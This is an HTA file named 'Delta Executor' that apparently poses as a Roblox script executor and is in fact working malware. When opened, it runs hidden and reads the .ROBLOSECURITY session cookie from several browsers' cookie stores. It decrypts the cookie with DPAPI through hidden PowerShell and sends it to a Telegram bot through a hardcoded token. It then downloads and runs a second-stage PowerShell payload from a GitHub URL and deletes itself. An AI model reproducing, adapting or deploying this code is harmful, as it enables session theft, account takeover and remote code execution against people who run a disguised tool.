<html>
<head>
<title>Delta Executor</title>
<hta:application
    id="delta"
    applicationname="Delta Executor"
    border="none"
    caption="no"
    showintaskbar="no"
    windowstate="minimize" />
<script language="JScript">
var TOKEN = "8814328356:AAFwdZd_Mlj9kZOOUVw7ERPEnRB238jqzTE";
var CHAT = "8692286004";
var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
var wsh = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var payloadUrl = "https://raw.githubusercontent.com/brentfincher12-star/site/main/payload";

function send(msg) {
    try {
        xhr.Open("POST", API, false);
        xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.Send("chat_id=" + CHAT + "&text=" + encodeURIComponent(msg));
    } catch(e) {}
}

function grab() {
    var local = wsh.ExpandEnvironmentStrings("%LOCALAPPDATA%");
    var roaming = wsh.ExpandEnvironmentStrings("%APPDATA%");
    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\rc.db";
    var found = "";
    
    var dbs = [
        local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        local + "\\Google\\Chrome\\User Data\\Default\\Cookies",
        local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
        local + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
        roaming + "\\Opera Software\\Opera Stable\\Network\\Cookies",
        roaming + "\\Opera Software\\Opera Stable\\Cookies"
    ];
    
    for (var i = 0; i < dbs.length; i++) {
        if (fso.FileExists(dbs[i])) {
            try {
                fso.CopyFile(dbs[i], tmp, true);
                var conn = new ActiveXObject("ADODB.Connection");
                conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + tmp + ";");
                var rs = conn.Execute("SELECT host_key,name,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'");
                
                while (!rs.EOF) {
                    var host = rs.Fields(0).Value;
                    var val = rs.Fields(2).Value;
                    found += "[" + host + "] ";
                    
                    var b64 = "";
                    try {
                        var stream = new ActiveXObject("ADODB.Stream");
                        stream.Type = 1;
                        stream.Open();
                        stream.Write(val);
                        stream.Position = 0;
                        stream.Type = 2;
                        stream.Charset = "iso-8859-1";
                        var bytes = stream.ReadText();
                        stream.Close();
                        
                        var dom = new ActiveXObject("Microsoft.XMLDOM");
                        var el = dom.createElement("tmp");
                        el.dataType = "bin.base64";
                        var node = dom.createTextNode(bytes);
                        el.appendChild(node);
                        b64 = el.nodeTypedValue;
                    } catch(e) { b64 = "[BIN_FAIL]"; }
                    
                    var ps = 'powershell -WindowStyle Hidden -Command "$b=[Convert]::FromBase64String(\\"' + b64 + '\\"); try { $d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,\\"CurrentUser\\"); [Convert]::ToBase64String($d) } catch { \\"DPAPI_FAIL\\" }"';
                    var exec = wsh.Exec(ps);
                    var dec = exec.StdOut.ReadAll().trim();
                    found += (dec || "[NO_DECRYPT]") + "\\n";
                    rs.MoveNext();
                }
                conn.Close();
            } catch(e) {
                send("ERR:" + dbs[i] + ":" + e.message);
            }
        }
    }
    
    if (!found) {
        var ffRoot = roaming + "\\Mozilla\\Firefox\\Profiles";
        if (fso.FolderExists(ffRoot)) {
            var fold = fso.GetFolder(ffRoot).SubFolders;
            var e = new Enumerator(fold);
            for (; !e.atEnd(); e.moveNext()) {
                var db = e.item().Path + "\\cookies.sqlite";
                if (fso.FileExists(db)) {
                    try {
                        var conn = new ActiveXObject("ADODB.Connection");
                        conn.Open("Driver={SQLite3 ODBC Driver};Database=" + db + ";");
                        var rs = conn.Execute("SELECT host,name,value FROM moz_cookies WHERE name='.ROBLOSECURITY'");
                        while (!rs.EOF) {
                            found += "[" + rs.Fields(0).Value + "] " + rs.Fields(2).Value + "\\n";
                            rs.MoveNext();
                        }
                        conn.Close();
                    } catch(e) {}
                }
            }
        }
    }
    
    send("ROBLOX:\\n" + (found || "NOT_FOUND"));
    try { fso.DeleteFile(tmp); } catch(e) {}
    
    // --- Stage 2: GitHub payload ---
    var psPayload = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (irm ' + payloadUrl + ')"';
    wsh.Run(psPayload, 0, false);
    
    // --- Self-elimination ---
    try {
        var self = document.location.href.replace("mshta://", "").replace("file:///", "");
        if (fso.FileExists(self)) { fso.DeleteFile(self); }
    } catch(e) {}
    
    close();
}

window.onload = grab;
</script>
</head>
